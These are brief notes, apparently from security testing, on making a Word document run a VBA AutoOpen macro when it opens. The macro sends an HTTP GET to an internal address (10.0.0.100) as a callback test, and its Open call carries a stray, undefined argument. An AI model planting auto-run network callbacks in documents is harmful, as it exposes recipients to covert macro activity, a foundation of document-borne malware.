1. Open word doc, Alt+F8 Open macro, F5 Run. Key word AutoOpen runs on opening doc. 

Sub AutoOpen()
'
Dim xHttp
Set xHttp = CreateObject("MSXML2.ServerXMLHTTP.6.0")
xHttp.Open "GET", "http://10.0.0.100/Does-not-exist.txt", URL, False
xHttp.Send
' AutoOpen
End Sub

You may want to auto-exec. File > Options > Cust Ribbon > Enable Developer
